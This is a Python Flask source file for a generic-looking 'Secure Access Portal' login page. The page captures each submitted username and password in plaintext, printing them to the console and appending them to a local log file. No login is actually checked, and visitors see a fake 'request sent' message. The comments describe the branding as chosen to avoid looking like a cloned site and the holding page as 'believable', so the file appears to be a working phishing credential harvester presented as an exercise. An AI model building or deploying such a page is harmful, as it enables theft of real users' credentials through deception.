from flask import Flask, request, render_template_string, url_for
import datetime
from colorama import init, Fore, Style
import re
import os

init(autoreset=True)  # Initialize colorama

app = Flask(__name__)

# We change the branding to "Secure Access Portal" to avoid looking like a clone of a specific site.
# This makes the project look like a generic authentication exercise or a corporate portal.
HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Access Portal</title>
<style>
body { font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color:#f0f2f5; margin:0; padding:0; display:flex; justify-content:center; align-items:center; height:100vh; }
.container { background-color:white; padding: 40px; border-radius:12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
.logo-text { font-size: 24px; font-weight: bold; color: #1c1e21; margin-bottom: 20px; }
.form { display: flex; flex-direction: column; gap: 15px; }
.input_field { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
.btn-submit { background-color: #007bff; color: white; padding: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; transition: background 0.3s; }
.btn-submit:hover { background-color: #0056b3; }
.footer-text { margin-top: 20px; font-size: 13px; color: #666; }
.footer-text a { color: #007bff; text-decoration: none; }
</style>
</head>
<body>
<div class="container">
    <div class="logo-text">Secure Access Portal</div>
    <p style="color: #666; margin-bottom: 20px;">Please sign in to access your dashboard</p>
    <div class="form">
        <form method="POST" action="/auth" autocomplete="off">
            <input name="user_id" class="input_field" type="text" placeholder="Email or Username" required>
            <input name="access_key" class="input_field" type="password" placeholder="Password" required>
            <button type="submit" class="btn-submit">Continue</button>
        </form>
    </div>
    <div class="footer-text">
        Forgot password? <a href="#">Reset here</a>
    </div>
</div>
</body>
</html>"""

def format_log_entry(user_id, access_key, ip="unknown"):
    """Creates a formatted console output for monitoring authentication attempts."""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Using a clean, professional format
    lines = [
        f"{Fore.CYAN}--- AUTHENTICATION EVENT ---",
        f"Timestamp: {timestamp}",
        f"Source IP: {ip}",
        f"Identity: {Fore.YELLOW}{user_id}",
        f"Credential: {Fore.YELLOW}{access_key}",
        f"{Fore.CYAN}---------------------------"
    ]
    return "\n".join(lines)

@app.route("/")
def index():
    """Serves the generic access portal."""
    return render_template_string(HTML_PAGE)

@app.route("/auth", methods=["POST"])
def authenticate():
    """Handles the form submission and logs the event."""
    user_id = request.form.get("user_id", "N/A")
    access_key = request.form.get("access_key", "N/A")
    ip_address = request.remote_addr or "unknown"

    # Log to console for the admin
    print(format_log_entry(user_id, access_key, ip_address))

    # Log to a local file for auditing
    try:
        with open("auth_audit.log", "a") as log_file:
            log_file.write(f"[{datetime.datetime.now()}] IP: {ip_address} | ID: {user_id} | Key: {access_key}\n")
    except Exception as e:
        print(f"Logging error: {e}")

    # Redirect to a believable 'Success' page or a generic message
    return "<h1>Authentication request sent.</h1><p>Please wait for the system to redirect you...</p>"

if __name__ == "__main__":
    # Use a non-standard port to avoid conflicts
    PORT = int(os.environ.get("PORT", 5001))
    app.run(host="0.0.0.0", port=PORT, debug=False)
